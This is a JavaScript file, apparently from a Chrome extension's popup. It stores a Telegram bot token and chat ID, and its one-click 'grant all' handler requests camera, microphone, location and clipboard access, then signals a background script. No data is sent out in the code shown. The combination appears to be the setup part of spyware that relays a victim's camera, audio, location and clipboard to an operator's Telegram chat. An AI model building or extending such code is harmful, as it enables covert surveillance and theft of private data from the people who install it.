document.getElementById('save').addEventListener('click', () => {
  const token = document.getElementById('botToken').value;
  const chatId = document.getElementById('chatId').value;
  chrome.storage.local.set({ botToken: token, chatId: chatId }, () => {
    document.getElementById('status').innerText = 'Saved!';
  });
});

document.getElementById('grantAll').addEventListener('click', async () => {
  const status = document.getElementById('status');
  status.innerText = 'Requesting...';
  let allOk = true;
  try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); s.getTracks().forEach(t=>t.stop()); status.innerText += '\n✅ Camera'; } catch(e) { status.innerText += '\n❌ Camera'; allOk=false; }
  try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); status.innerText += '\n✅ Mic'; } catch(e) { status.innerText += '\n❌ Mic'; allOk=false; }
  try { await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000})); status.innerText += '\n✅ Location'; } catch(e) { status.innerText += '\n⚠️ Location (maybe no GPS)'; }
  try { await navigator.clipboard.readText(); status.innerText += '\n✅ Clipboard'; } catch(e) { status.innerText += '\n⚠️ Clipboard'; }
  chrome.runtime.sendMessage({ type: 'perm_granted' });
  chrome.storage.local.set({ permGranted: true });
  status.innerText += '\n\n🎉 All done! Close popup.';
});
